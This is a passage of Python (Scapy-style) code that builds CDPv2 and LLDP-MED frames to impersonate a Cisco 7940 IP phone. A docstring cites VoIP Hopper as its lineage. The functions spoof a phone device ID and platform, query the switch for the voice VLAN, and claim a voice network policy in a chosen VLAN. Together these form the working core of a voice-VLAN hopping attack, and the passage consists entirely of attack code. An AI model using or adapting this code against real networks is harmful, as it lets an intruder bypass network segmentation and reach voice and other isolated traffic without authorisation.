def cdp_tlv(t, v):
    return struct.pack("!HH", t, 4 + len(v)) + v


def cdp_frame(m, tlvs, ttl=180):
    """CDPv2 frame + correct 16-bit one's-complement checksum."""
    body = struct.pack("!BBH", 2, ttl, 0) + tlvs
    if len(body) % 2:
        body += b"\x00"
    s = 0
    for i in range(0, len(body), 2):
        s += (body[i] << 8) | body[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s = (s >> 16) + (s & 0xFFFF)
    body = struct.pack("!BBH", 2, ttl, (~s) & 0xFFFF) + tlvs
    return (Ether(dst="01:00:0c:cc:cc:cc", src=m) /
            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
            SNAP(OUI=0x00000C, code=0x2000) / body)


def cdp_phone_frame(m):
    """Impersonate a Cisco 7940-era phone (VoIP Hopper lineage)."""
    devid = ("SEP" + m.replace(":", "").upper()).encode()
    tlvs = (cdp_tlv(0x0001, devid) +
            cdp_tlv(0x0003, b"Port 2") +
            cdp_tlv(0x0004, struct.pack("!I", 0x90)) +      # Host|Phone
            cdp_tlv(0x0005, b"SIP41.9-4-2SR3S") +
            cdp_tlv(0x0006, b"Cisco IP Phone 7940") +
            cdp_tlv(0x000F, b"\x00\x00\x00"))              # VoIP VLAN Query
    return cdp_frame(m, tlvs)


def lldp_phone_frame(m, vvid):
    """LLDP-MED Network Policy TLV claiming voice in VLAN vvid.
    MED NP value: apptype(1)=1 voice, then 16b = U|T|X|VLAN-ID(12),
    L2-prio byte, DSCP byte (TIA-1057)."""
    policy = struct.pack("!BHBB", 1, 0x4000 | (vvid & 0x0FFF), 0xA0, 0x2E)
    org = LLDPDUGenericOrganisationSpecific
    med = 0x0012BB
    l = (Ether(dst="01:80:c2:00:00:0e", src=m, type=0x88CC) /
         LLDPDU() /
         LLDPDUChassisID(subtype=4, id=m) /
         LLDPDUPortID(subtype=5, id="1") /
         LLDPDUTimeToLive(ttl=180) /
         org(org_code=med, subtype=1, data=b"\x13\x00\x03") /
         org(org_code=med, subtype=2, data=policy) /
         LLDPDUEndOfLLDPDU())
    return l


